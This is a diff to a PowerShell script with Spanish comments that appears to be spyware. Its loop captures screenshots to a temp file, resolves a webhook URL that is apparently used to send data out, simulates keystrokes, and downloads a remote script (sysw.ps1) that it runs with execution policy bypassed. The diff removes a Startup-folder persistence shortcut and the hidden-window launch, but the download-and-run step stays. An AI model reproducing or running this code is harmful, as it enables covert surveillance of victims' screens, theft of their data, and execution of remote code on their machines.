@@ -15,7 +15,7 @@ function SendKeystrokes {
 }
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
 
 do {
     $Filett = "$env:temp\SC.png"
@@ -53,16 +53,8 @@ do {
         $syswPath = "$env:USERPROFILE\sysw.ps1"
         Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
         
-        # Crear acceso directo en la carpeta de inicio del usuario
-        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
-        $shell = New-Object -ComObject WScript.Shell
-        $shortcut = $shell.CreateShortcut($shortcutLocation)
-        $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
-        $shortcut.Save()
-        
-        # Ejecutar el script principal de manera oculta
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
+        # Ejecutar el script principal
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$syswPath`""
         
         # Reiniciar contador de imágenes
         $a = 0
